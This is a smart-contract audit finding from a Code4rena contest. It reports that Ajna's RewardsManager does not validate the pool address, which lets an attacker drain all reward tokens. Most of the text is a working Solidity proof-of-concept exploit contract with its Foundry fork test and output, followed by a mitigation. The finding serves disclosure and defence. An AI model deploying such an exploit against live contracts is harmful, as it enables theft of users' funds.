[H-11] RewardsManager fails to validatepool_when updating exchange rates allowing rewards to be drained
Submitted byvakzz, also found by0xWaitress,SpicyMeatball, and0xStalin
https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L310-L318https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L794-L794https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/RewardsManager.sol#L811-L821
TheupdateBucketExchangeRatesAndClaimmethod is designed to reward people for keeping the current exchange rate up to date (it has the following description: “Caller can claim5%of the rewards that have accumulated to each bucket since the last burn event, if it hasn’t already been updated”).
The issue is that there is no check on thepool_to ensure that is a valid ajna pool or that it is a pool from a currently staked token.
This means that an attacker can supply their own contract to control all of the values used to calculate the reward amount, allowing them to transfer an arbitrary amount of reward tokens (up to the balance of the rewards manager).
Proof of Concept
The following test can be placed inhttps://github.com/code-423n4/2023-05-ajna/tree/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/tests/forge/unit/RewardsasStealRewards.t.soland then run withforge test -m testStealRewards -vv, showing that an attacker can steal all of the ajna tokens held by the rewards manager:
$ forgetest-m testStealRewards -vvRunning 1testfortests/forge/unit/Rewards/StealRewards.t.sol:StealRewardsTest[PASS]testStealRewards() (gas: 494833)Logs:Rewards balance before: 100000000000000000000000000Hacker balance before:0Rewards balance after:0Hacker balance after:100000000000000000000000000Test result: ok. 1 passed; 0 failed; finishedin6.57s
// SPDX-License-Identifier: UNLICENSEDpragmasolidity0.8.14;import'src/RewardsManager.sol';import'src/PositionManager.sol';import'@std/Test.sol';import'@std/Vm.sol';contractStealRewards{ERC20ajnaToken;IRewardsManagerrewardsManager;uint256_currentBurnEpoch;uint256toSteal;constructor(ERC20_ajnaToken,IRewardsManager_rewardsManager) {ajnaToken=_ajnaToken;rewardsManager=_rewardsManager;}functioncurrentBurnEpoch()externalviewreturns(uint256) {return_currentBurnEpoch;}functionbucketExchangeRate(uint)externalviewreturns(uint256) {return1ether+_currentBurnEpoch;}functionburnInfo(uint256index)externalviewreturns(uint256burnBlock_,uint256totalInterest_,uint256totalBurned_) {if(index==1) {return(block.timestamp+2weeks,0,0);}else{return(block.timestamp+2weeks,1,toSteal*20);}}functionbucketInfo(uint256)externalpurereturns(uint256lpAccumulator_,uint256availableCollateral_,uint256bankruptcyTime_,uint256bucketDeposit_,uint256bucketScale_) {return(0,0,0,1ether,0);}functionsteal()external{toSteal=ajnaToken.balanceOf(address(rewardsManager));uint256[]memorydepositIndexes=newuint256[](1);depositIndexes[0] =0;// setup the `prevBucketExchangeRate`_currentBurnEpoch=1;rewardsManager.updateBucketExchangeRatesAndClaim(address(this),depositIndexes);_currentBurnEpoch=2;rewardsManager.updateBucketExchangeRatesAndClaim(address(this),depositIndexes);}}contractStealRewardsTestisTest{addressinternal_ajna=0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079;ERC20internal_ajnaToken;IRewardsManagerinternal_rewardsManager;IPositionManagerinternal_positionManager;ERC20PoolFactoryinternal_poolFactory;functionsetUp()external{vm.createSelectFork(vm.envString("ETH_RPC_URL"));_ajnaToken=ERC20(_ajna);_poolFactory=newERC20PoolFactory(_ajna);_positionManager=newPositionManager(_poolFactory,newERC721PoolFactory(_ajna));_rewardsManager=newRewardsManager(_ajna,_positionManager);deal(_ajna,address(_rewardsManager),100_000_000*1e18);assertEq(_ajnaToken.balanceOf(address(_rewardsManager)),100_000_000*1e18);}functiontestStealRewards()external{StealRewardsstealRewards=newStealRewards(_ajnaToken,_rewardsManager);uintrewardsManagerBalance=_ajnaToken.balanceOf(address(_rewardsManager));emitlog_named_uint("Rewards balance before",rewardsManagerBalance);emitlog_named_uint("Hacker balance before ",_ajnaToken.balanceOf(address(stealRewards)));stealRewards.steal();assertEq(_ajnaToken.balanceOf(address(stealRewards)),rewardsManagerBalance);assertEq(_ajnaToken.balanceOf(address(_rewardsManager)),0);emitlog_named_uint("Rewards balance after ",_ajnaToken.balanceOf(address(_rewardsManager)));emitlog_named_uint("Hacker balance after  ",_ajnaToken.balanceOf(address(stealRewards)));}}
Tools Used
Foundry, IntelliJ
Recommended Mitigation Steps
TheupdateBucketExchangeRatesAndClaimmethod should only be able to be called with a valid Ajna pool (seePositionManager._isAjnaPool) and potentially only allow pools from the currently staked tokens.
MikeHathaway (Ajna) confirmed via duplicate issue#207